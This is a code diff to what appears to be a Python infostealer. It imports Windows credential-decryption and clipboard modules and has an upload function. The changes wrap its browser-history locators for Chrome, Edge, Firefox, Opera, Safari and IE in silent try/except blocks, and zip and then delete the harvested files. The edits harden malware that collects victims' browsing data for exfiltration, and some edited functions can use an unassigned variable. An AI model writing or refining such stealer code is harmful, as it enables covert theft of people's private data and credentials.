@@ -45,7 +45,6 @@ for modl in requirements:
         
 from win32crypt import CryptUnprotectData
 import requests
-from PIL import ImageGrab
 from ctypes import *
 from Crypto.Cipher import AES
 import win32clipboard
@@ -660,68 +659,84 @@ def upload_file(file_path):
 
 
 def find_history_file(browser_name, path_template):
-    if os.name == "nt":
-        data_path = os.path.expanduser(path_template.format(browser_name))
-    elif os.name == "posix":
-        data_path = os.path.expanduser(path_template.format(browser_name))
-    else:
+    try:
+        if os.name == "nt":
+            data_path = os.path.expanduser(path_template.format(browser_name))
+        elif os.name == "posix":
+            data_path = os.path.expanduser(path_template.format(browser_name))
+        else:
+            return None
+
+        return data_path if os.path.exists(data_path) else None
+    except:
         return None
-
-    return data_path if os.path.exists(data_path) else None
-
 def find_chrome_history_file():
-    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
-
+    try:return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+    except:
+        return None
 def find_edge_history_file():
-    return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
-
+    try:return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+    except:
+        return None
 def find_operagx_history_file():
-    return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")
+    try:
+        return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")
+    except:
+        return None
 
 def find_firefox_history_file():
-    if os.name == "nt":
-        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
-    elif os.name == "posix":
-        profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
-    else:
+    try:
+        if os.name == "nt":
+            profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+        elif os.name == "posix":
+            profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
+        else:
+            return None
+
+        profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
+        if not profiles:
+            return None
+
+        profile_path = os.path.join(profile_path, profiles[0])
+        history_file_path = os.path.join(profile_path, "places.sqlite")
+
+        return history_file_path if os.path.exists(history_file_path) else None
+    except:
         return None
-
-    profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
-    if not profiles:
-        return None
-
-    profile_path = os.path.join(profile_path, profiles[0])
-    history_file_path = os.path.join(profile_path, "places.sqlite")
-
-    return history_file_path if os.path.exists(history_file_path) else None
 
 def find_opera_history_file():
-    return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
+    try:
+        return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
+    except:
+        return None
 
 def find_safari_history_file():
-    if os.name == "nt":
-        data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
-    elif os.name == "posix":
-        data_path = os.path.expanduser("~/Library/Safari/History.db")
-    else:
+    try:
+        if os.name == "nt":
+            data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
+        elif os.name == "posix":
+            data_path = os.path.expanduser("~/Library/Safari/History.db")
+    except:
         return None
 
     return data_path if os.path.exists(data_path) else None
 
 def find_ie_history_file():
-    if os.name == "nt":
-        data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
-    else:
+    try:
+        if os.name == "nt":
+            data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
+    except:
         return None
 
     return data_path if os.path.exists(data_path) else None
 
 def find_safari_technology_preview_history_file():
-    if os.name == "nt":
-        data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
-    elif os.name == "posix":
-        data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
-    else:
+    try:
+        if os.name == "nt":
+            data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
+        elif os.name == "posix":
+            data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
+    except:
         return None
 
     return data_path if os.path.exists(data_path) else None
@@ -744,9 +759,8 @@ def save_search_history_to_file(history_file, output_file):
                     file.write(f"{formatted_time}: {title} - {url}\n")
         cursor.close()
         conn.close()
-    except sqlite3.Error as e:
-        if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
-            pass
+    except (sqlite3.Error, IOError) as e:
+        pass
 
 def is_process_running(process_name):
     try:
@@ -771,9 +785,9 @@ def extract_history_with_timeout(browser_name, find_history_func, temp_dir, file
         try:
             save_search_history_to_file(history_file, output_file)
             files_to_zip.append(output_file)
-        except sqlite3.Error as e:
-            if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
-                pass
+        except:
+            pass
+            
 
 def create_browser_zip(browser_name, find_history_func, temp_dir):
     history_file = find_history_func()
@@ -814,11 +828,14 @@ def brohist():
                 for file_to_zip in files_to_zip:
                     if os.path.exists(file_to_zip):
                         zipf.write(file_to_zip, os.path.basename(file_to_zip))
-                        os.remove(file_to_zip)  
+                        os.remove(file_to_zip)
+    except:pass
     finally:
         for file_to_delete in files_to_zip:
             if os.path.exists(file_to_delete):
                 os.remove(file_to_delete)
+
+
 
 def histup():
     try:
